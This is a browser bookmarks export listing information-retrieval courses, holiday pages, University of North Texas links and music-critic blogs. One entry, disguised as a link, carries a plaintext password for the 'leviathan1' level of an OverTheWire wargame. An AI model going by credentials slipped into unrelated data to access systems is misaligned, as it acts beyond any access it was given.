<DT><A HREF="http://www.asis.org/Publications/JASIS/" ADD_DATE="1101795001" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Journal of the American Society for Information Science</A>
<DT><A HREF="http://www.wkap.nl/journals/ir" ADD_DATE="1146769510" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Retrieval</A>
<DT><A HREF="http://www.cs.wpi.edu/~ifc/courses/CS525I/" ADD_DATE="1158795974" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	CS525I Information Retrieval Systems</A>

<DT><A HREF="http://tux.cs.brown.edu/courses/cs295-3/" ADD_DATE="1153843618" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Topics in Information Retrieval and Data Mining</A>
<DT><A HREF="http://www.sims.berkeley.edu/courses/is202/f99/" ADD_DATE="1124785593" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	SIMS 202: Information Organization and Retrieval</A>
<DT><A HREF="http://www.sims.berkeley.edu/courses/is296a-4/f99/" ADD_DATE="1151619441" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	SIMS 296a-4: Text Data Mining</A>
<DT><A HREF="http://maya.cs.depaul.edu/~mobasher/classes/ds599/" ADD_DATE="1150131906" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Intelligent Information Retrieval</A>
<DT><A HREF="http://www.gslis.utexas.edu/~palmquis/inforets99/" ADD_DATE="1153510296" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	LIS 385T.6: Concepts of Information Retrieval</A>
<DT><A HREF="http://www.cs.cmu.edu/afs/cs.cmu.edu/academic/class/15850-s99/www/home.html" ADD_DATE="1131423617" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	15-850: Algorithms for Indexing and Searching</A>
<DT><A HREF="http://www.cs.umbc.edu/~nicholas/courses/691d/index.html" ADD_DATE="1115173612" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	CS 491/691 - Data-driven Information Processing</A>
<DT><A HREF="http://www.cs.utk.edu/~cs494/" ADD_DATE="1153220561" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	CS 494 - Information Retrieval</A>
<DT><A HREF="http://www.cs.princeton.edu/courses/archive/spring98/cs598b/" ADD_DATE="1138911329" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Access: Issues for the Web &amp; Digital Libraries</A>

<DT><A HREF="http://ciir.cs.umass.edu/cmpsci646/" ADD_DATE="1116372863" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Text-Based Information Systems</A>
<DT><A HREF="http://hobart.cs.umass.edu/~allan/irclass.html" ADD_DATE="1133006360" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Text-Based Information Systems</A>
<DT><A HREF="http://www.cs.wisc.edu/~shavlik/cs838/cs838.html" ADD_DATE="1140738449" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	CS838 - Machine Learning and Information Retrieval</A>
<DT><A HREF="http://ei.cs.vt.edu/~cs5604/" ADD_DATE="1132133487" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	CS5604 - Information Storage and Retrieval</A>
<DT><A HREF="http://www.ags.uci.edu/~jblevins/reviews/DISE/DISE_syllabus.html" ADD_DATE="1138745172" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	Distributed Information Services and Environments</A>
<DT><A HREF="http://pi0959.kub.nl:2080/Paai/Onderw/Ir/ir.html" ADD_DATE="1103254180" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Retrieval</A>
<DT><A HREF="http://www.cs.duke.edu/education/courses/cps370/fall98/" ADD_DATE="1112914390" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	CPS 370: Using the Web to Solve Crossword Puzzles</A>
<DT><A HREF="http://www.cs.ualberta.ca/~tszhu/webmining.htm" ADD_DATE="1141236903" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Web Mining</A>
<DT><A HREF="http://etupc19.wiwi.uni-karlsruhe.de/webmining/bib/" ADD_DATE="1133449362" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Webmining - Bibliography</A>

<DT><A HREF="http://xtasy.lib.indiana.edu/jmdocs/irsys.html" ADD_DATE="1150837814" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	IR Systems Design &amp; Evaluation</A>
<DT><A HREF="http://www.muc.saic.com/" ADD_DATE="1154503219" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	SAIC Information Extraction</A>
<DT><A HREF="http://www.cs.mu.oz.au/~alistair/" ADD_DATE="1142069314" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Alistair Moffat's Page</A>
<DT><A HREF="http://www.cs.mu.oz.au/~alistair/exploring/" ADD_DATE="1143464000" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Exploring the Similarity Space</A>

<DT><A HREF="http://www-users.cs.umn.edu/~mobasher/webminer/survey/survey.html" ADD_DATE="1160019139" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Web Mining: Information and Pattern Discovery on the World Wide Web</A>
<DT><A HREF="http://www.cs.umbc.edu/~mayfield/ngrams.html" ADD_DATE="1151661509" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Research on N-Grams in Information Retrieval</A>
<DT><A HREF="http://websom.hut.fi/" ADD_DATE="1128214935" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	WEBSOM - Self-Organizing Map for Internet Exploration</A>
<DT><A HREF="http://www.cs.umbc.edu/abir/" ADD_DATE="1130033645" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Agent-based Information Retrieval</A>
<DT><A HREF="http://www.asis.org/midyear-96/girillpaper.html" ADD_DATE="1128905394" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	Fuzzy Matching as a Retrieval-Enabling Technique for Digital Libraries</A>
<DT><A HREF="http://www-ir.inf.ethz.ch/Public-Web-Pages/mittendorf/mittendorf.html" ADD_DATE="1104719816" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Elke Mittendorf's Page</A>
<DT><A HREF="http://lcavwww.epfl.ch/LSI/index.html" ADD_DATE="1131777503" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Image and Multimedia Retrieval</A>
<DT><A HREF="http://www.religioustolerance.org/winter_solstice.htm" ADD_DATE="1108907192" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Winter Solstice Celebrations</A>
<DT><A HREF="http://renaissance.dm.net/compendium/63.html" ADD_DATE="1120518639" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Keeping Christmas</A>
<DT><A HREF="http://www.beliefnetgreetings.com/" ADD_DATE="1104281784" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">BeliefNet webcards</A>
<DT><A HREF="http://www.fortunecity.com/victorian/museum/59/index.html" ADD_DATE="1105265704" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Silent Night Museum</A>
<DT><A HREF="http://www.earthcalendar.org/gatso1.htm" ADD_DATE="1145257685" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Meditations for the Solstice</A>
<DT><A HREF="mail.html" ADD_DATE="1145838339" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">[VISITOR COMMENTS]</A>
<DT><A HREF="mailto:lynch@unt.edu" ADD_DATE="1145267944" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Claudia
        Lynch</A>
<DT><A HREF="../march00/links.htm" ADD_DATE="1136826225" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">March</A>
<DT><A HREF="../../../../news/" ADD_DATE="1155347077" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">UNT News and Events</A>
<DT><A HREF="../../../../events" ADD_DATE="1109721139" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Events Calendar</A>
<DT><A HREF="../../../../untpress" ADD_DATE="1110924433" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">University of North
                Texas Press</A>
<DT><A HREF="http://www.ntdaily.com/" ADD_DATE="1129461452" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">NT Daily</A>
<DT><A HREF="../../../../printingservices" ADD_DATE="1127474996" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Printing
                Services and Copy Centers</A>
<DT><A HREF="../../../../mailservices/" ADD_DATE="1151399878" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mail Services</A>
<DT><A HREF="http://essc.unt.edu" ADD_DATE="1118761662" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Eagle Student
                Services Center </A>

<DT><A HREF="#launched" ADD_DATE="1100110302" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">below</A>
<DT><A HREF="../../../../colleges.html" ADD_DATE="1133588373" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Colleges and
                Schools</A>
<DT><A HREF="../../../../masterplan/index.html" ADD_DATE="1139052173" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Campus
                Master Plan</A>
<DT><A HREF="../../../../unt-dallas/" ADD_DATE="1117908330" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">UNT System Center
                at Dallas</A>
<DT><A HREF="http://www.hsc.unt.edu/" ADD_DATE="1150933616" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">UNT Health
                Science Center at Ft. Worth</A>
<DT><A HREF="../../../../union/const-si.htm" ADD_DATE="1150891816" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Campus Chat
                Food Court </A>
<DT><A HREF="../../../../union/avesta.htm" ADD_DATE="1104099268" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Avesta</A>
<DT><A HREF="http://www.scs.unt.edu/smhm/cci.html" ADD_DATE="1154027716" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The
                Club at College Inn </A>
<DT><A HREF="../../../../volunteer/" ADD_DATE="1109643880" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">VolUNTeer Center</A>

<DT><A HREF="../../../../topten.html" ADD_DATE="1110820780" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">UNT Top Ten Sites</A>
<DT><A HREF="http://www.state.tx.us/" ADD_DATE="1118647555" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">State of Texas</A>
<DT><A HREF="http://www.wfaa.com/wfaa/articledisplay/0,1002,14118,00.html" ADD_DATE="1146546471" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">here</A>
<DT><A HREF="../../../../hr/employment/bulletin.htm" ADD_DATE="1154506759" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Employment
                Bulletin </A>
<DT><A HREF="http://www.nationjob.com/dallas/" ADD_DATE="1109858803" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">NationJob</A>
<DT><A HREF="../../../../hr/newsflash.htm" ADD_DATE="1111500532" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Human
                Resources NewsFlash</A>
<DT><A HREF="http://www.ers.state.tx.us/" ADD_DATE="1120865852" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Employees
                Retirement System of Texas</A>
<DT><A HREF="../../../../ses/" ADD_DATE="1159643686" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Student Employment
                Services</A>
<DT><A HREF="../../../../facsenate/facultysenate.htm" ADD_DATE="1116304897" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Faculty
                Senate</A>

<DT><A HREF="../../../../recsports/stafffitness/framefsf.htm" ADD_DATE="1145067204" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Faculty/Staff
                Fitness Program</A>
<DT><A HREF="../../../../legalaffairs/" ADD_DATE="1114366810" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Legal Affairs</A>
<DT><A HREF="../../../../planning/" ADD_DATE="1112586446" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Office of University
                Planning</A>
<DT><A HREF="../../../../planning/Surveys/index.html" ADD_DATE="1126566055" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">results</A>
<DT><A HREF="../../../../planning/UNT_Policy/cover.html" ADD_DATE="1159583611" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">University
                Policy Manual </A>
<DT><A HREF="http://www.tsl.state.tx.us/" ADD_DATE="1149361528" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Texas State
                Library and Archive Information</A>
<DT><A HREF="http://www.tsl.state.tx.us/trail/index.html" ADD_DATE="1121661988" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">TRAIL</A>
<DT><A HREF="../../../../catalogs/catsched.htm" ADD_DATE="1109053607" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Calendars,
                Schedules &amp; Catalogs</A>

<DT><A HREF="../../../../ses/" ADD_DATE="1160234819" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Student Employment
                Services</A>
<DT><A HREF="../../../../ISP/sac/" ADD_DATE="1151072298" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Study Abroad Center
                (SAC)</A>
<DT><A HREF="../../../../shc/" ADD_DATE="1136477460" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Student Health Center</A>
<DT><A HREF="../../../../diningservices/" ADD_DATE="1151383553" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">UNT Dining
                Services</A>
<DT><A HREF="http://essc.unt.edu" ADD_DATE="1109582816" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Eagle Student
                Services Center </A>
<DT><A HREF="https://www.admin2.unt.edu/webapps/myfinaid" ADD_DATE="1136536619" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">&quot;My
                Financial Aid.&quot;</A>
<DT><A HREF="../../../../etd/" ADD_DATE="1124720783" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Electronic Preparation
                and Filing of Theses and Dissertations </A>
<DT><A HREF="http://www.tsgs.unt.edu/" ADD_DATE="1148583847" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Toulouse
                School</A>
<DT><A HREF="http://cuinfo.cornell.edu/Student/GRFN/" ADD_DATE="1154393807" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">External
                Funding for Graduate Students </A>

<DT><A HREF="http://www.opgf.unt.edu/" ADD_DATE="1115403256" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Postgraduate
                Fellowships</A>
<DT><A HREF="mailto:(jduban@unt.edu" ADD_DATE="1139224519" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">(jduban@unt.edu</A>
<DT><A HREF="http://larc.csci.unt.edu" ADD_DATE="1158441932" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Laboratory for
                Recreational Computing</A>

<DT><A HREF="http://djearlybird.blogspot.com" ADD_DATE="1126386782" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">hot out herre: The adventures of Mike Appelstein</A>

<DT><A HREF="http://xrrf.blogspot.com/" ADD_DATE="1104665604" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Simon B</A>
<DT><A HREF="http://www.jaybabcock.com/" ADD_DATE="1146694931" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jay Babcock</A>
<DT><A HREF="http://banananutrament.blogspot.com/" ADD_DATE="1159342000" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Banana Nutrament</A>
<DT><A HREF="http://rockcritics.com/archives/bangs.html" ADD_DATE="1145352911" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Lester Bangs</A>
<DT><A HREF="http://33third.blogspot.com/" ADD_DATE="1118577274" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">David Barker</A>
<DT><A HREF="http://slapdeebarnes.blogspot.com/" ADD_DATE="1137836028" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">slap dee barnes</A>
<DT><A HREF="http://clem-bastow.rocks.it/" ADD_DATE="1148555948" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Clem Bastow</A>
<DT><A HREF="http://beardmag.blogspot.com/" ADD_DATE="1131440521" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Beardblog</A>
<DT><A HREF="http://www.brassland.org/ahb/" ADD_DATE="1118821788" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Alec Hanley Bemis</A>

<DT><A HREF="http://ashtrayheart.blogspot.com/" ADD_DATE="1121754166" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">James Blount</A>
<DT><A HREF="http://www.thebrazilianmuse.blogspot.com/" ADD_DATE="1122027192" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">the brazilian muse</A>
<DT><A HREF="http://www.rockandrollreport.com" ADD_DATE="1113073864" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mark Boudreau</A>
<DT><A HREF="http://www.villagevoice.com/blogs/statusainthood/" ADD_DATE="1103572336" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tom Breihan</A>
<DT><A HREF="http://dabble-rouser.blogspot.com/" ADD_DATE="1105240048" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Caryn Brooks</A>
<DT><A HREF="http://konvolutm.blogspot.com/" ADD_DATE="1112841859" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Franklin Bruno</A>
<DT><A HREF="http://website.lineone.net/~jon.simmons/julie/" ADD_DATE="1155182703" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Julie Burchill</A>
<DT><A HREF="http://www.punkrockblues.motime.com/" ADD_DATE="1133403841" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tim Byrnes</A>
<DT><A HREF="http://wisdomgoof.blogspot.com/" ADD_DATE="1142824361" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Graham C</A>

<DT><A HREF="http://www.urbanhonking.com/brokenlanguage/" ADD_DATE="1123836954" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jon Caramanica</A>
<DT><A HREF="http://bloggedyblog.blogspot.com" ADD_DATE="1138072514" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Andrew Careaga</A>
<DT><A HREF="http://gravitygirl.shafted.com.au/" ADD_DATE="1114350721" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Anthony Carew</A>
<DT><A HREF="http://hemingwoid.blogspot.com/" ADD_DATE="1139209572" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Marcello Carlin</A>
<DT><A HREF="http://nostudium.blogspot.com/" ADD_DATE="1141286018" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Naked Maja</A>
<DT><A HREF="http://cookham.blogspot.com/" ADD_DATE="1139669556" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Church of Me</A>
<DT><A HREF="http://elidor.blogspot.com/" ADD_DATE="1119116640" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Robin Carmody</A>
<DT><A HREF="http://the-other-ones.blogspot.com/" ADD_DATE="1135867819" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Other Ones</A>
<DT><A HREF="http://www.themusicissue.blogspot.com/" ADD_DATE="1154869154" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Daphne Carr</A>

<DT><A HREF="http://cantstopwontstop.blogspot.com/" ADD_DATE="1152482862" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jeff Chang</A>
<DT><A HREF="http://robertchristgau.com/" ADD_DATE="1101622093" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Robert Christgau</A>
<DT><A HREF="http://haibun.blogspot.com" ADD_DATE="1124991220" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Matt Cibula</A>
<DT><A HREF="http://www.zerointerrupt.com/punktum/" ADD_DATE="1118618500" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Nathalie Claeys</A>
<DT><A HREF="http://www.joeclark.org/QiYEmain.html" ADD_DATE="1106236554" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Joe Clark</A>
<DT><A HREF="http://www.alternatetuning.blogspot.com/" ADD_DATE="1111435008" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Justin Cober-Lake</A>
<DT><A HREF="http://www.cloudsandclocks.net/home_temp.html" ADD_DATE="1117709357" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"> Beppe Colli</A>
<DT><A HREF="http://jdconsidine.blogspot.com/" ADD_DATE="1151538323" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">J.D. Considine</A>

<DT><A HREF="http://www.coolfer.com/blog/" ADD_DATE="1129961139" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Coolfer</A>
<DT><A HREF="http://carolcooper.org/" ADD_DATE="1155494242" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Carol Cooper</A>
<DT><A HREF="http://ihavezeromoney.blogspot.com/" ADD_DATE="1139843127" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Cozen</A>
<DT><A HREF="http://www.charlesrcross.com/" ADD_DATE="1101150517" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Charles R. Cross</A>
<DT><A HREF="http://www.sirencristy.blogspot.com/" ADD_DATE="1114064887" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Siren Cristy</A>
<DT><A HREF="http://www.cameroncroweonline.com/" ADD_DATE="1101346149" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Cameron Crowe</A>
<DT><A HREF="http://thinthanfamous.blogspot.com/" ADD_DATE="1123126567" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Joseph Csontos</A>
<DT><A HREF="http://jaymc.blogspot.com/" ADD_DATE="1127087608" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">John Cunningham</A>
<DT><A HREF="http://www.epicharmus.com/" ADD_DATE="1104867343" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Michael Daddino</A>

<DT><A HREF="http://www.epicharmus.com/loatd.htm" ADD_DATE="1128315473" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">American Hot Wax</A>
<DT><A HREF="http://sugarhigh.abstractdynamics.org/" ADD_DATE="1139878325" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">jane dark</A>
<DT><A HREF="http://www.lastplanetojakarta.com/menu.html" ADD_DATE="1159998903" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">John Darnielle</A>
<DT><A HREF="http://www.techgnosis.com/" ADD_DATE="1101468170" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Erik Davis</A>
<DT><A HREF="http://theoriginalsoundtrack.com/blog/" ADD_DATE="1122451542" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Geeta Dayal</A>
<DT><A HREF="http://www.michaeldeeds.com/" ADD_DATE="1123584714" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Michael Deeds</A>
<DT><A HREF="http://members.tripod.com/~phildellio/index.html" ADD_DATE="1139489541" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Phil Dellio</A>
<DT><A HREF="http://jimdero.com/" ADD_DATE="1136751121" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jim DeRogatis</A>
<DT><A HREF="http://discodelivery.blogspot.com/" ADD_DATE="1102543142" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Disco Delivery</A>

<DT><A HREF="http://djmartian.blogspot.com/" ADD_DATE="1120524416" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">DJ Martian</A>
<DT><A HREF="http://docmartian.livejournal.com/" ADD_DATE="1116169534" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Doc Martian</A>
<DT><A HREF="http://musicchamber.blogspot.com/" ADD_DATE="1121608640" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tim Ellison</A>
<DT><A HREF="http://oysterman9.blogspot.com/" ADD_DATE="1156341092" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">glyn emerson</A>
<DT><A HREF="http://www.freakytrigger.co.uk/popular/" ADD_DATE="1110787544" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Popular</A>
<DT><A HREF="http://www.geocities.com/joefernbacher/" ADD_DATE="1113840359" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Joe Fernbacher</A>
<DT><A HREF="http://getphysical.blogspot.com/" ADD_DATE="1157912042" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tim Finney</A>
<DT><A HREF="http://beatsandrants.blogs.com/" ADD_DATE="1135727622" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Trent Fitzgerald</A>
<DT><A HREF="http://flaskaland.blogspot.com/" ADD_DATE="1132407717" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Barbara Flaska</A>

<DT><A HREF="http://benfongtorres.com/" ADD_DATE="1103897453" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ben Fong-Torres</A>
<DT><A HREF="http://thefreelancementalists.blogspot.com/" ADD_DATE="1147111487" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Freelance Mentalists</A>
<DT><A HREF="http://runningthevoodoodown.blogspot.com/" ADD_DATE="1150065931" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Phil Freeman</A>
<DT><A HREF="http://www.bagatellen.com/" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Phil</A>
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
<DT><A HREF="http://www.sashafrerejones.com" ADD_DATE="1116821483" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sasha Frere-Jones</A>
<DT><A HREF="http://musik.antville.org/" ADD_DATE="1145309029" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Alexander Fritz</A>
<DT><A HREF="http://www.donnagaines.com/" ADD_DATE="1134976617" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">DonnaGaines.com</A>
<DT><A HREF="http://home.earthlink.net/~kgann/" ADD_DATE="1117920858" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Kyle Gann</A>
<DT><A HREF="http://www.nelsongeorge.com/blog/" ADD_DATE="1159322773" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Nelson George</A>

<DT><A HREF="http://www.nelsongeorge.com/" ADD_DATE="1136271624" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">NelsonGeorge</A>
<DT><A HREF="http://neumu.net/drama/" ADD_DATE="1140996282" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Michael Goldberg</A>
<DT><A HREF="http://www.stevegoz.com/" ADD_DATE="1126159238" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Gozdecki</A>
<DT><A HREF="http://yeweiblog.blogspot.com/" ADD_DATE="1141087824" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jason Gross</A>
<DT><A HREF="http://guterman.com/" ADD_DATE="1109060611" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jimmy Guterman</A>
<DT><A HREF="http://usefulnoise.blogspot.com/" ADD_DATE="1105786419" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Keith Harris</A>
<DT><A HREF="http://useful-noise.blogspot.com/" ADD_DATE="1140835584" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">As Yet Untitled</A>
<DT><A HREF="http://unscene.blogspot.com/" ADD_DATE="1110477638" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Joel Hartse</A>
<DT><A HREF="http://fineturkishtobacco.blogspot.com/" ADD_DATE="1128186819" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jess Harvell</A>

<DT><A HREF="http://giganticmag.com/" ADD_DATE="1104169155" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Kenan Hebert</A>
<DT><A HREF="http://circusoffools.blogspot.com/" ADD_DATE="1149916037" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Joris Heemskerk</A>
<DT><A HREF="http://bangsheet.blogspot.com/" ADD_DATE="1104686796" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Kurt Hernon</A>
<DT><A HREF="http://hollerif.blogspot.com" ADD_DATE="1106661155" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Holler If Ya Hear Me</A>
